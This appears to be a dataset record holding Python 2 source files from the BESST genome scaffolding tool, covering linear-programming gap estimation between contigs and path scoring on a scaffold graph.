                exp_means_gapest[(i,j,is_PE_link)] = self.observations[(i,j,is_PE_link)][0] + GC.GapEstimator(self.contamination_mean, self.contamination_stddev, self.read_len, mean_obs, self.ctgs[i].length, self.ctgs[j].length)
                #print 'GAPEST:',mean_obs, self.ctgs[i].length, self.ctgs[j].length, 'gap:' ,  GC.GapEstimator(self.contamination_mean, self.contamination_stddev, self.read_len, mean_obs, self.ctgs[i].length, self.ctgs[j].length)

            else:
                if param.lognormal:
                    samples =  self.observations[(i,j,is_PE_link)][3]
                    exp_means_gapest[(i,j,is_PE_link)] = self.observations[(i,j,is_PE_link)][0] + lnpe.GapEstimator(param.lognormal_mean, param.lognormal_sigma, self.read_len, samples, self.ctgs[i].length, c2_len=self.ctgs[j].length)
                else:
                    exp_means_gapest[(i,j,is_PE_link)] = self.observations[(i,j,is_PE_link)][0] + GC.GapEstimator(self.mean, self.stddev, self.read_len, mean_obs, self.ctgs[i].length, self.ctgs[j].length)
                    #print 'GAPEST:',mean_obs, self.ctgs[i].length, self.ctgs[j].length, 'gap:' ,  GC.GapEstimator(self.mean, self.stddev, self.read_len, mean_obs, self.ctgs[i].length, self.ctgs[j].length)
        

        if all(length in self.ctg_lengths for length in [670, 2093]) or all(length in self.ctg_lengths for length in [900, 3810]) or all(length in self.ctg_lengths for length in [2528, 591]) or all(length in self.ctg_lengths for length in [734, 257, 1548]):

            for (i,j,is_PE_link) in self.observations:
                mean_obs = self.observations[(i,j,is_PE_link)][0]
                if is_PE_link:
                    #exp_means_gapest[(i,j,is_PE_link)] = self.observations[(i,j,is_PE_link)][0] + GC.GapEstimator(self.contamination_mean, self.contamination_stddev, self.read_len, mean_obs, self.ctgs[i].length, self.ctgs[j].length)
                    print >> param.information_file, 'GAPEST:',mean_obs, self.ctgs[i].length, self.ctgs[j].length, 'gap:' ,  GC.GapEstimator(self.contamination_mean, self.contamination_stddev, self.read_len, mean_obs, self.ctgs[i].length, self.ctgs[j].length)

                else:
                    #exp_means_gapest[(i,j,is_PE_link)] = self.observations[(i,j,is_PE_link)][0] + GC.GapEstimator(self.mean, self.stddev, self.read_len, mean_obs, self.ctgs[i].length, self.ctgs[j].length)
                    print >> param.information_file, 'GAPEST:',mean_obs, self.ctgs[i].length, self.ctgs[j].length, 'gap:' ,  GC.GapEstimator(self.mean, self.stddev, self.read_len, mean_obs, self.ctgs[i].length, self.ctgs[j].length)


        ####################
        ####### NEW ########
        ####################
        
        # convert problem to standard form 
        #  minimize    z = c' x
        # subject to  A x = b, x >= 0
        # b does not neccessarily need to be a positive vector

        # decide how long rows.
        # we need 2*g gap variables because they can be negative
        # and r help variables because absolute sign in objective function

        t = LpForm()  

        g = len(self.ctgs)-1
        r = len(self.observations)
        n = 2*g+r 

        #A = []
        #c = []
        #b = []
        # add  gap variable constraints g_i = x_i - y_i <= mean + 2stddev, x_i,y_i >= 0
        # gap 0 on column 0, gap1 on column 1 etc.

        for i in range(g):
            row = [0]*n
            row[2*i] = 1      # x_i
            row[2*i+1] = -1   # y_i
            #A.append(row)
            #b.append(self.mean + 2*self.stddev)
            t.add_constraint(row, self.mean + 2*self.stddev)

        # add r help variable constraints (for one case in absolute value)
        for h_index,(i,j,is_PE_link) in enumerate(self.observations):
            row = [0]*n
            
            # g gap variable constants
            for k in range(n):
                if i<= k <j:
                    row[2*k] = -1
                    row[2*k+1] =  1
            
            # r Help variables
            row[ 2*g + h_index] = -1

            # sum of ""inbetween"" contig lengths + observation
            constant =   sum(map(lambda x: x.length, self.ctgs[i+1:j])) + self.observations[(i,j,is_PE_link)][0]
            predicted_distance = exp_means_gapest[(i,j,is_PE_link)]

            t.add_constraint(row, constant - predicted_distance)

        # add r help variable constraints (for the other case in absolute value)
        for h_index,(i,j,is_PE_link) in enumerate(self.observations):
            row = [0]*n
            
            # q gap variable constants
            for k in range(n):
                if i<= k <j:
                    row[2*k] = 1
                    row[2*k+1] = -1
            
            # r Help variables
            row[ 2*g + h_index] = -1

            # sum of ""inbetween"" contig lengths + observation
            constant = sum(map(lambda x: x.length, self.ctgs[i+1:j])) + self.observations[(i,j,is_PE_link)][0]
            predicted_distance = exp_means_gapest[(i,j,is_PE_link)]

            t.add_constraint(row, predicted_distance - constant )

        # add objective row

        # calculate the total penalties of discrepancies of stddevs given assigned orientations
        # of all edges
        obj_delta_stddev = 0
        if self.contamination_ratio:
            obj_row = [0]*n
            for h_index,(i,j,is_PE_link) in enumerate(self.observations):
                n = self.observations[(i,j,is_PE_link)][1]
                obs_stddev = self.observations[(i,j,is_PE_link)][2]
                if is_PE_link:
                    obj_delta_stddev += abs(self.contamination_stddev - obs_stddev) * n
                else:
                    obj_delta_stddev += abs(self.stddev - obs_stddev) * n

                obj_row[ 2*g + h_index] = is_PE_link * n + (1-is_PE_link) * n
                #obj_row[ 2*g + h_index] = is_PE_link*self.stddev*n + (1-is_PE_link)*self.contamination_stddev * n

                #obj_row[ 2*g + h_index] = is_PE_link * self.stddev  * self.observations[(i,j,is_PE_link)][1] +  (1-is_PE_link) * self.contamination_stddev * self.observations[(i,j,is_PE_link)][1]
                # obj_row[ 2*g + h_index] = is_PE_link * self.stddev * (1 - self.contamination_ratio) * self.observations[(i,j,is_PE_link)][1] +  (1-is_PE_link) * self.contamination_stddev * (self.contamination_ratio)*self.observations[(i,j,is_PE_link)][1]
                t.add_objective(obj_row)
        else:
            obj_row = [0]*n
            for h_index,(i,j,is_PE_link) in enumerate(self.observations):
                obj_row[ 2*g + h_index] = self.observations[(i,j,is_PE_link)][1]
                t.add_objective(obj_row)

        A, b, c = t.standard_form()

        # sol_lsq =np.linalg.lstsq(A,b)
        # print ""LEAST SQUARES SOLUTION:""
        # print sol_lsq[0]

        #t.display()

        # print 'Objective:', c 
        # for row in A:
        #     print 'constraint:', row
        # print 'constnts:', b
        lpsol = lp_solve(c,A,b,tol=1e-4)
        optx = lpsol.x
        # zmin = lpsol.fun
        # bounded = lpsol.is_bounded
        # solvable = lpsol.is_solvable
        # basis = lpsol.basis
        # print "" ---->""
        # print ""optx:"",optx
        # print ""zmin:"",zmin
        # print ""bounded:"",bounded
        # print ""solvable:"",solvable
        # print ""basis:"",basis
        # print ""-------------------------------------------""

        # print ""LP SOLUTION:""
        # print optx

        # transform solutions to gaps back
        gap_solution = []
        for i in range(g):
            gap_solution.append( round (optx[2*i] -optx[2*i +1],0) )           

        self.objective = lpsol.fun

        # also add the penalties from the observed standard deviations
        #self.objective += obj_delta_stddev
        
        # ctg_lengths = map(lambda x: x.length, self.ctgs)
        # if 1359 in ctg_lengths and 673 in ctg_lengths: #len(path.gaps) >= 4:
        #     print 'Obj:',self.objective
        #     print ""of which stddev contributing:"", obj_delta_stddev
        #print ""objective:"",self.objective
        
        #### Use the added accurace from the narrow contamine distribution here
        #### to further precisely adjust the gaps in the LP solution if there is 
        #### any pe links
        if self.contamination_ratio:
            for g_i in xrange(g):
                if (g_i, g_i +1, True) in self.observations: # if it is a PE-link
                    mean_obs = self.observations[(g_i, g_i+1, True)][0]
                    gap_contamination = exp_means_gapest[(g_i, g_i+1, True)] - mean_obs
                    old_gap = gap_solution[g_i]
                    gap_solution[g_i] = gap_contamination
                    #print "" changing contamination gap from: {0} to {1}"".format(old_gap, gap_contamination)

        return gap_solution

    def __str__(self):
        string= ''
        for ctg in self.ctgs:
            string += 'c'+str(ctg.index) +',startpos:'+ str(ctg.position)+',endpos:'+str(ctg.position + ctg.length)+'\n'

        return string

        
# def ordered_search(path):

#     path.get_inferred_isizes()

#     for c1 in range(len(path.ctgs)-1):
#         for c2 in range(c1+1,len(path.ctgs)):
#             if (c1,c2) in path.observations:
#                 suggested_path = path.new_state_for_ordered_search(c1,c2,path.mean,path.stddev)
#                 suggested_path.update_positions()
#                 suggested_path.get_inferred_isizes()
#                 suggested_path.calc_dist_objective()
#                 if suggested_path.calc_dist_objective() < path.calc_dist_objective():
#                     #print ""SWITCHED PATH TO SUGGESTED PATH!!""
#                     path = suggested_path
#                     #print path
#                 else:
#                     pass
#                     #print 'PATH not taken!'
#             else:
#                 continue
      
#     # print 'FINAL PATH:'
#     # print path
#     # print 'With likelihood: ', path.calc_log_likelihood(mean,stddev)  

#     return path



def main(contig_lenghts, observations, param):
    """"""
    contig_lenghts: Ordered list of integers which is contig lengths (ordered as contigs comes in the path)
    observations:  dictionary oflist of observations, eg for contigs c1,c2,c3
                    we can have [(c1,c2):[23, 33, 21],(c1,c3):[12,14,11],(c2,c3):[11,34,32]]
    """"""

    path = Path(contig_lenghts,observations, param)
    
    if path.observations == None:
        return None

    # ML_path = MCMC(path,mean,stddev)
    # ML_path = ordered_search(path,mean,stddev)

    optimal_LP_gaps = path.LP_solve_gaps(param)
    path.gaps = optimal_LP_gaps
    ctg_lengths = map(lambda x: x.length, path.ctgs)
    if all(length in ctg_lengths for length in [670, 2093]) or all(length in ctg_lengths for length in [900, 3810]) or all(length in ctg_lengths for length in [2528, 591]) or all(length in ctg_lengths for length in [734, 257, 1548]):  #len(path.gaps) >= 4:
        print >> param.information_file, 'Solution:', path.gaps
        print >> param.information_file, ""objective:"",path.objective
        print >> param.information_file, 'ctg lengths:', map(lambda x: x.length, path.ctgs)
        print >> param.information_file, 'mp links:', path.mp_links
        print >> param.information_file, 'pe links:', path.pe_links
        print >> param.information_file, 'PE relative freq', path.pe_links / (path.pe_links + path.mp_links)

    path.update_positions()

    # print 'MCMC path:'
    # print ML_path
    # print 'MCMC path likelihood:',ML_path.calc_log_likelihood(mean,stddev)
    # print 'Ordered search path:'
    # print ML_path
    # print 'Ordered search likelihood:',ML_path.calc_log_likelihood(mean,stddev)
    # return ML_path

    return path

if __name__ == '__main__':
    contig_lenghts = [3000,500,500,500,3000]
    observations_normal = {(0,1):[1800,2000], (0,2):[1500,1800,1400,1700], (0,3):[1200,800,1000], 
                    (1,2):[750,800],(1,3):[600,700], (1,4):[300,600,700],
                    (2,3):[700,750], (2,4):[1400,1570],
                    (3,4):[2000,1750], }

    observations_linear = {(0,1):[450,500],  (1,2):[750,800],
                    (2,3):[700,750], (3,4):[400,170]}

    # The imortance of support:
    # one edge with a lot of observatins contradicting the others
    observations_matter = {(0,1):[450,500],  (1,2):[750,800],
                    (2,3):[700,750], (3,4):[400,170],
                    (0,4):[700]*30 }

    # long contig, 500bp gap, 3*short_contigs, long contig
    observations = {(0,1):[1450,1300,1200,1570], (0,2):[700,800,1000], (0,3):[250,300],
                    (1,2):[900],(1,3):[900,800], (1,4):[800,900,1000],
                    (2,3):[900], (2,4):[900,800],
                    (3,4):[1500,1750,1350,1900,1950] }

    # negative gaps test case here:

 
    mean = 1500
    stddev = 500
    read_len = 100
    main(contig_lenghts,observations,mean,stddev, read_len)


/n/n/n",0
201,fc4187255ea8be704c14b4fe3e57cb8eecdcb59e,"/BESST/ExtendLargeScaffolds.py/n/n
'''
    Created on Jun 21, 2012
    
    @author: ksahlin
    
    This file is part of BESST.
    
    BESST is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.
    
    BESST is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.
    
    You should have received a copy of the GNU General Public License
    along with BESST.  If not, see <http://www.gnu.org/licenses/>.
    '''

import time
import networkx as nx
from collections import defaultdict
import multiprocessing as mp


def ScorePaths(G, paths, all_paths, param):
    if len(paths) == 0:
        return ()

    def calculate_connectivity(path, G):
        """"""
            Contig ends has even or odd numbered placements (index) in the path list. In case
            of contamination, good links are between an even to an odd indexed contig-end, or vice versa.

        """"""
        bad_link_weight = 0
        good_link_weight = 0
        links_not_in_path = 0
        links_wrong_orientation_in_path = 0
        even, odd = path[::2], path[1::2]
        nodes_even = set(even)
        nodes_odd = set(odd)
        visited = set()
        for i, node in enumerate(path):
            for nbr in G.neighbors(node):
                if i % 2 == 0 and node[0] != nbr[0]:
                    if nbr in nodes_odd:
                        if nbr not in visited:
                            good_link_weight += G[node][nbr]['nr_links']
                        else:
                            pass
                    else:
                        bad_link_weight += G[node][nbr]['nr_links']
                elif i % 2 == 1 and node[0] != nbr[0]:
                    if nbr not in nodes_even:
                        bad_link_weight += G[node][nbr]['nr_links']
                    elif nbr not in visited:
                        bad_link_weight += G[node][nbr]['nr_links']
            visited.add(node)
        good_link_weight = good_link_weight
        bad_link_weight = bad_link_weight
        try:
            score = good_link_weight / float(bad_link_weight)
        except ZeroDivisionError:
            score = good_link_weight

        return score, bad_link_weight


    def calculate_connectivity_contamination(path, G):
        """"""
            Contig ends has even or odd numbered placements (index) in the path list. In case
            of contamination, good links are between an even to an odd indexed contig-end, or vice versa.

        """"""
        bad_link_weight = 0
        good_link_weight = 0
        links_not_in_path = 0
        links_wrong_orientation_in_path = 0
        even, odd = path[::2], path[1::2]
        nodes_even = set(even)
        nodes_odd = set(odd)
        for i, node in enumerate(path):
            for nbr in G.neighbors(node):
                if i % 2 == 0 and node[0] != nbr[0]:
                    if nbr in nodes_odd:
                        good_link_weight += G[node][nbr]['nr_links']
                    else:
                        bad_link_weight += G[node][nbr]['nr_links']
                elif i % 2 == 1 and node[0] != nbr[0]:
                    if nbr in nodes_even:
                        good_link_weight += G[node][nbr]['nr_links']
                    else:
                        bad_link_weight += G[node][nbr]['nr_links']
        good_link_weight = good_link_weight/2
        bad_link_weight = bad_link_weight

        # ###############


        try:
            score = good_link_weight / float(bad_link_weight)
        except ZeroDivisionError:
            score = good_link_weight

        return score, bad_link_weight


    #print '\nSTARTING scoring paths:'
    for path_ in paths:
        path = path_[0]
        path_len = path_[1]
        #calculate spanning score s_ci
        if param.contamination_ratio:
            score, bad_link_weight = calculate_connectivity_contamination(path, G)
        else:
            score, bad_link_weight = calculate_connectivity(path, G)


        if param.no_score and score >= param.score_cutoff:
            all_paths.append([score, bad_link_weight, path, path_len])
            #Insert_path(all_paths, score, path , bad_link_weight, path_len)
        elif len(path) > 2 and score >= param.score_cutoff: #startnode and end node are not directly connected
            all_paths.append([score, bad_link_weight, path, path_len])
            #Insert_path(all_paths, score, path , bad_link_weight, path_len)

    return ()

def find_all_paths_for_start_node(graph, start, end, already_visited, is_withing_scaf, max_path_length_allowed, param):
    path = []
    paths = []
    if start[1] == 'L':
        forbidden = set()
        forbidden.add((start[0], 'R'))
    else:
        forbidden = set()
        forbidden.add((start[0], 'L'))

    #Joining within scaffolds
    if is_withing_scaf:
        element = end.pop()
        end.add(element)
        if element[1] == 'L':
            forbidden.add((element[0], 'R'))
        else:
            forbidden.add((element[0], 'L'))


    #TODO: Have length criteria that limits the path lenght due to complecity reasons. Can also identify strange
    #links by looking how many neighbors a contig has and how mych the library actually can span
    path_len = 0
    queue = [(start, path, path_len)]#, sum_path)]
    #prev_node = start
    counter = 0
    while queue:
        #prev_node = start
        counter += 1
        #if counter % 100 == 0:
        #    print 'Potential paths:', counter, 'paths found: ', len(paths)
        if counter > param.path_threshold or len(path) > 100:
            print 'Hit path_threshold of {0} iterations! consider increase --iter <int> parameter to over {0} if speed of BESST is not a problem. Standard increase is, e.g., 2-10x of current value'.format(param.path_threshold)
            break
            
        start, path, path_len = queue.pop() #start, end, path, sum_path = queue.pop()  
        try:
            prev_node = path[-1]
        except IndexError:
            prev_node = start
        path = path + [start]
        path_len = len(path)
        #print 'PATH', path ,'end', end 
        if path_len > max_path_length_allowed: #All possible paths can be exponential!! need something to stop algorithm in time
            continue
        #if score < score_best_path: # need something to stop a bad path
        #    continue
        if start in already_visited or start in forbidden:
            continue

        if start in end:
            # if (start_node, start) in nodes_present_in_path:
            #     nodes_present_in_path[(start_node, start)] = nodes_present_in_path[(start_node, start)].union(path)
            # else:
            #     nodes_present_in_path[(start_node, start)] = set(path)
            paths.append((path, path_len))
            continue


        if  prev_node[0] != start[0]:
            if start[1] == 'L' and (start[0], 'R') not in forbidden:
                queue.append(((start[0], 'R'), path, path_len)) #, sum_path + graph[start][(start[0], 'R')]['nr_links']))
            elif start[1] == 'R' and (start[0], 'L') not in forbidden:
                queue.append(((start[0], 'L'), path, path_len))#, sum_path + graph[start][(start[0], 'L')]['nr_links']))                
        else:
            for node in set(graph[start]).difference(path):
                if node not in forbidden: # and node not in already_visited: 
                    try: # if last node (i.e. ""end"") it is not present in small_scaffolds and it should not be included in the length
                        queue.append((node, path, path_len + graph[node[0]]['length'])) #  small_scaffolds[node[0]].s_length))   #
                    except KeyError:
                        queue.append((node, path, path_len))

    return paths



def BetweenScaffolds(G_prime, end, iter_nodes, param):
    # here we should have a for loop looping over all start nodes. Start nodes already examined should be removed in a nice way to skip over counting
    already_visited = set()
    all_paths = []
    print 'Entering ""find_all_paths_for_start_node"" '
    iter_count = 0
    cnter = 0
    if param.max_extensions:
        iter_threshold = param.max_extensions
    else: 
        iter_threshold = len(end)

    print 'iterating until maximum of {0} extensions.'.format(iter_threshold) 
    print 'nodes:{0}, edges: {1}'.format(len(G_prime.nodes()), len(G_prime.edges()))
    while len(iter_nodes) > 0 and iter_count <= iter_threshold:
        iter_count += 1
        start_node = iter_nodes.pop()
        if cnter % 100 == 0:
            print 'enter Betwween scaf node: ', cnter
        end.difference_update(set([start_node]))
        paths = find_all_paths_for_start_node(G_prime, start_node, end, already_visited, 0, 2 ** 32, param)
        already_visited.add(start_node)
        ScorePaths(G_prime, paths, all_paths, param)
        cnter += 1
    #all_paths = ExtendScaffolds(all_paths)
    #print all_paths
    print 'Total nr of paths found: {0} with score larger than: {1}'.format(len(all_paths), param.score_cutoff)
    all_paths.sort(key=lambda list_: list_[0]) 
    #print all_paths
    return(all_paths)

def WithinScaffolds(G, G_prime, start, end_node, already_visited, max_path_length, param):
    end = set()
    end.add(end_node)
    all_paths = []
    already_visited.difference_update(set([start, end_node]))
    paths = find_all_paths_for_start_node(G_prime, start, end, already_visited, 1, max_path_length, param)
    already_visited.add(start)
    already_visited.add(end_node)
    #print paths
    if len(paths) > 1:
        ScorePaths(G_prime, paths, all_paths,param)
        all_paths.sort(key=lambda list_: list_[0]) 

        if len(all_paths) > 0:
            return all_paths

    return []

if __name__ == '__main__':
    import Scaffold
    small_scaffolds_test = {}
    for i in range(1, 7):
        S = Scaffold.scaffold(i, 0, 0, {}, {})
        small_scaffolds_test[S.name] = S
    start = time()
    G_prime = nx.Graph()
    #G.add_nodes_from([(1, 'L'), (1, 'R'), (2, 'L'), (2, 'R'), (3, 'L'), (3, 'R'), (4, 'L'), (4, 'R'), (5, 'L'), (5, 'R')]) 
    for i in range(1, 7):
        G_prime.add_edge((i, 'L'), (i, 'R'), {'nr_links':0})
    G_prime.add_edges_from([((1, 'R'), (2, 'R'), {'nr_links':1}), ((3, 'L'), (4, 'L'), {'nr_links':1}), ((2, 'L'), (3, 'R'), {'nr_links':1}), ((1, 'R'), (5, 'L'), {'nr_links':2}),
                       ((5, 'R'), (4, 'L'), {'nr_links':3}), ((2, 'L'), (5, 'L'), {'nr_links':2}), ((1, 'R'), (4, 'L'), {'nr_links':8}), ((2, 'L'), (6, 'L'), {'nr_links':3}),
                       ((1, 'L'), (4, 'R'), {'nr_links':1}), ((1, 'L'), (4, 'L'), {'nr_links':1}), ((3, 'L'), (4, 'R'), {'nr_links':1}),
                        ((1, 'R'), (2, 'L'), {'nr_links':1}), ((1, 'R'), (5, 'R'), {'nr_links':1}), ((2, 'L'), (5, 'R'), {'nr_links':1})])
    G = nx.Graph()
    G.add_nodes_from([(1, 'L'), (1, 'R'), (4, 'L'), (4, 'R'), (6, 'L'), (6, 'R')])
    contigs = [1, 2, 3, 4, 5, 6]

    print 'Between'
    BetweenScaffolds(G, G_prime, small_scaffolds_test)
    start_node = (1, 'R')
    end_node = (4, 'L')
    print 'Within'
    already_visited = set(G.nodes())
    print already_visited
    WithinScaffolds(G, G_prime, small_scaffolds_test, start_node, end_node, already_visited, 0)
    elapsed = time() - start
    print 'time all paths: ', elapsed


/n/n/n/BESST/order_contigs.py/n/n'''
    Created on May 30, 2014

    @author: ksahlin

    This file is part of BESST.

    BESST is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    BESST is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with BESST.  If not, see <http://www.gnu.org/licenses/>.
    '''

import copy
import math
import random
from collections import Counter
import cPickle
import os
import subprocess
import mathstats.log_normal_param_est as lnpe


#import numpy as np


from mathstats.normaldist.normal import normpdf
from mathstats.normaldist.truncatedskewed import param_est as GC

from BESST.lp_solve import lp_solve


class LpForm(object):
    """"""docstring for LpForm""""""
    def __init__(self):
        super(LpForm, self).__init__()
        self.rows = []
        self.b = []

    def add_objective(self, obj):
        self.obj = obj

    def add_constraint(self, expression, value):
        self.rows.append(expression)
        self.b.append(value)

    def standard_form(self):
        """"""
         Converts Ax' <=b
         to Ax = b, b >= 0
         by introducing slack/surplus variables
        """"""

        A = []
        c = []

        # build full tableau and convert to normal form if negative constants
        tot_slack_variables = len(self.rows)

        for i in range(len(self.rows)):
            ident = [0 for r in range(len(self.rows))]
            
            # if negative constant
            if self.b[i] < 0:
                # add a surplus variable 
                ident[i] = -1
                #reverse all other values
                self.rows[i] = [ -k for k in self.rows[i] ]
                self.rows[i] += ident 
                # change sign of constant
                self.b[i] = -self.b[i]

            # if positive constant
            else:
                # add a slack varaible
                ident[i] = 1
                self.rows[i] += ident
            
        A = self.rows

        c = self.obj + [0]*tot_slack_variables 
        return A, self.b, c


class Contig(object):
    """"""Container with contig information for a contig in a path""""""
    def __init__(self, index, length):
        super(Contig, self).__init__()
        self.index = index
        self.length = length
        self.position = None
        

class Path(object):
    """"""Contains all information of a path. This is basically a supgraph of the 
    Scaffold graph in BESST contianing all contigs in a path that has high score 
    and is going to be made into a scaffold. 

    Path is an object with methods for calculating likelihood of a path given link observations.
    Due to computational requiremants, we don't calculate the true likelihoos all paths usually have thousands
    of links. Instead, we take the average link obervation between all contigs. This will not give true ML 
    estimates but speeds up calculation with thousands of x order. In practice, using average link obervation 
    For ML estimation will give a fairly good prediction. For this cheat, see comment approx 15 lines below.  """"""
    def __init__(self, ctg_lengths, observations, param):
        super(Path, self).__init__()
        self.mean = param.mean_ins_size
        self.stddev = param.std_dev_ins_size
        self.read_len = param.read_len
        self.contamination_ratio = param.contamination_ratio
        self.contamination_mean = param.contamination_mean
        self.contamination_stddev = param.contamination_stddev
        self.ctgs = []
        self.ctg_lengths = ctg_lengths
        for i,length in enumerate(ctg_lengths):
            self.ctgs.append(Contig(i, length))
        self.ctgs = tuple(self.ctgs)
        self.gaps = [0]*(len(ctg_lengths)-1) # n contigs has n-1 gaps between them, start with gap size 0  
        
        # get positions for when all gaps are 0
        self.update_positions()

        # let us cheat here! Instead of calculating likeliooods of thousands of
        # onservations we calculate the ikelihood for them average (mean) of the
        # observations and weight it with the number of observations
        self.mp_links = 0.0
        self.pe_links = 0.0
        obs_dict = {}


        if all(length in self.ctg_lengths for length in [670, 2093]) or all(length in self.ctg_lengths for length in [900, 3810]) or all(length in self.ctg_lengths for length in [2528, 591]) or all(length in self.ctg_lengths for length in [734, 257, 1548]):
            print >> param.information_file, ''
            print >> param.information_file, '' 
            print >> param.information_file, 'Setting up path', ctg_lengths
            for c1,c2,is_PE_link in observations:
                mean_obs, nr_obs, stddev_obs, list_of_obs = observations[(c1,c2,is_PE_link)]
                if is_PE_link:
                    mean_PE_obs = self.ctgs[c1].length + self.ctgs[c2].length - observations[(c1,c2,is_PE_link)][0] + 2*param.read_len
                    list_of_obs = [ self.ctgs[c1].length + self.ctgs[c2].length - obs + 2*param.read_len for obs in list_of_obs]
                    print >> param.information_file, 'PE LINK, mean obs:', mean_PE_obs, 'stddev obs:', stddev_obs, 'nr obs:', nr_obs, 'c1 length', self.ctgs[c1].length, 'c2 length', self.ctgs[c2].length
                    obs_dict[(c1, c2, is_PE_link)] = (mean_PE_obs, nr_obs, stddev_obs, list_of_obs)
                    self.pe_links += nr_obs
                    # if mean_PE_obs > self.contamination_mean + 6 * self.contamination_stddev:
                    #     self.observations = None
                    #     return None
                else:
                    #mean_obs = sum(observations[(c1,c2,is_PE_link)])/nr_obs
                    print >> param.information_file, 'MP LINK, mean obs:', mean_obs, 'stddev obs:', stddev_obs, 'nr obs:', nr_obs, 'c1 length', self.ctgs[c1].length, 'c2 length', self.ctgs[c2].length

                    obs_dict[(c1, c2, is_PE_link)] = (mean_obs, nr_obs, stddev_obs, list_of_obs)
                    self.mp_links += nr_obs
            print >> param.information_file, ''
            print >> param.information_file, ''


        for c1,c2,is_PE_link in observations:
            #nr_obs = len(observations[(c1,c2,is_PE_link)])
            mean_obs, nr_obs, stddev_obs, list_of_obs = observations[(c1,c2,is_PE_link)]
            if is_PE_link:
                mean_PE_obs = self.ctgs[c1].length + self.ctgs[c2].length - observations[(c1,c2,is_PE_link)][0] + 2*param.read_len 
                list_of_obs = [ self.ctgs[c1].length + self.ctgs[c2].length - obs + 2*param.read_len for obs in list_of_obs]
                #PE_obs = map(lambda x: self.ctgs[c1].length + self.ctgs[c2].length - x + 2*param.read_len ,observations[(c1,c2,is_PE_link)])
                #mean_obs = sum( PE_obs)/nr_obs
                obs_dict[(c1, c2, is_PE_link)] = (mean_PE_obs, nr_obs, stddev_obs, list_of_obs)
                self.pe_links += nr_obs
                # if mean_PE_obs > self.contamination_mean + 6 * self.contamination_stddev and not initial_path:
                #     self.observations = None
                #     return None
            else:
                #mean_obs = sum(observations[(c1,c2,is_PE_link)])/nr_obs
                obs_dict[(c1, c2, is_PE_link)] = (mean_obs, nr_obs, stddev_obs, list_of_obs)
                self.mp_links += nr_obs
            

        self.observations = obs_dict
        #print self.observations


        # for c1,c2 in self.observations:
        #     if self.observations[(c1,c2)][0] > 1500:
        #         print self.observations


    def get_distance(self,start_index,stop_index):
        total_contig_length = sum(map(lambda x: x.length ,filter(lambda x: start_index <= x.index < stop_index, self.ctgs) ))
        total_gap_length = sum(self.gaps[start_index:stop_index])
        index_adjusting = len(self.gaps[start_index:stop_index]) # one extra bp shifted each time
        return (total_contig_length, total_gap_length, index_adjusting)

    def update_positions(self):
        for ctg in self.ctgs:
            index = ctg.index
            ctg.position = sum(self.get_distance(0,index))

    # def get_inferred_isizes(self):
    #     self.isizes = {}

    #     for (c1,c2,is_PE_link) in self.observations:
    #         gap = self.ctgs[c2].position - (self.ctgs[c1].position + self.ctgs[c1].length) - (c2-c1) # last thing is an index thing
    #         #x = map(lambda obs: obs[0] + gap , self.observations[(c1,c2)]) # inferr isizes
    #         x = self.observations[(c1,c2,is_PE_link)][0] + gap
    #         self.isizes[(c1,c2,is_PE_link)] = x

    # def get_GapEst_isizes(self):
    #     self.gapest_predictions = {}
    #     for (i,j,is_PE_link) in self.observations:
    #         mean_obs = self.observations[(i,j,is_PE_link)][0]
    #         if is_PE_link:
    #             self.gapest_predictions[(i,j,is_PE_link)] = self.observations[(i,j,is_PE_link)][0] + GC.GapEstimator(self.contamination_mean, self.contamination_stddev, self.read_len, mean_obs, self.ctgs[i].length, self.ctgs[j].length)
    #         else:
    #             self.gapest_predictions[(i,j,is_PE_link)] = self.observations[(i,j,is_PE_link)][0] + GC.GapEstimator(self.mean, self.stddev, self.read_len, mean_obs, self.ctgs[i].length, self.ctgs[j].length)

    #         #print mean_obs, self.ctgs[i].length, self.ctgs[j].length, 'gap:' ,  GC.GapEstimator(self.mean, self.stddev, self.read_len, mean_obs, self.ctgs[i].length, self.ctgs[j].length)
        


    # def new_state_for_ordered_search(self,start_contig,stop_contig,mean,stddev):
    #     """"""
    #         This function gives a new state between two contigs c1 and c2 in the contig path
    #         that we will change the gap size for.
    #         Currently, we change the gap to expected_mean_obs - mean_observation, e.g. a
    #         semi-naive estimation. More variablity in gap prediction could be acheved in the 
    #         same way as described for function propose_new_state_MCMC().
             
    #     """"""
    #     new_path = copy.deepcopy(self) # create a new state
    #     (c1,c2) = (start_contig,stop_contig)
    #     mean_obs = self.observations[(c1,c2,0)][0] if (c1,c2,0) in self.observations else self.observations[(c1,c2,1)][0]  # take out observations and
    #     exp_mean_over_bp = mean + stddev**2/float(mean+1)
    #     proposed_distance = exp_mean_over_bp - mean_obs # choose what value to set between c1 and c2 

    #     #print 'CHOSEN:', (c1,c2), 'mean_obs:', mean_obs, 'proposed distance:', proposed_distance
    #     (total_contig_length, total_gap_length, index_adjusting) = self.get_distance(c1+1,c2)
    #     #print 'total ctg length, gap_lenght,index adjust', (total_contig_length, total_gap_length, index_adjusting)
    #     avg_suggested_gap = (proposed_distance - total_contig_length) / (c2-c1)
    #     #print avg_suggested_gap, proposed_distance, total_contig_length, c2-c1
    #     for index in range(c1,c2):
    #         new_path.gaps[index] = avg_suggested_gap
    #     #new_path.gaps[index] = proposed_distance
    #     return new_path


    # def calc_log_likelihood(self,mean,stddev):
    #     log_likelihood_value = 0
    #     exp_mean_over_bp = mean + stddev**2/float(mean+1)
    #     for (c1,c2) in self.isizes:
    #         log_likelihood_value += math.log( normpdf(self.isizes[(c1,c2)],exp_mean_over_bp, stddev) ) * self.observations[(c1,c2)][1]
    #         #for isize in self.isizes[(c1,c2)]:
    #         #    log_likelihood_value += math.log( normpdf(isize,mean,stddev) )
            
    #     return log_likelihood_value

    # def calc_dist_objective(self):
    #     objective_value = 0
    #     self.get_GapEst_isizes()
    #     for (c1,c2, is_PE_link) in self.isizes:
    #         objective_value += abs(self.gapest_predictions[(c1,c2,is_PE_link)] - self.isizes[(c1,c2,is_PE_link)]) * self.observations[(c1,c2,is_PE_link)][1]
